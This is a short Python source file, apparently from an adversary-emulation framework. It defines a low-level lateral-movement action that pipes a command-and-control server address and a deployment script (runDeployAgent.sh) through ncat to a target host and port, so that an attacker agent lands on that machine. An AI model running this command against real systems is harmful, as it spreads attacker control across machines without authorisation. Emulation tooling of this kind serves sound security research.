from ..low_level_action import LowLevelAction
from incalmo.core.models.attacker.agent import Agent
from config.settings import settings


class NCLateralMove(LowLevelAction):
    ability_name = "deception-ncshell"

    def __init__(
        self, agent: Agent, host_ip: str, port: str, high_level_action_id: str
    ):
        self.host_ip = host_ip
        self.port = port

        command = f'{{ echo "server={settings.c2_server}"; cat runDeployAgent.sh; }} | ncat --no-shutdown -i 5s {host_ip} #{port}'
        payloads = ["runDeployAgent.sh"]

        super().__init__(
            agent,
            command,
            payloads=payloads,
            command_delay=3,
            high_level_action_id=high_level_action_id,
        )
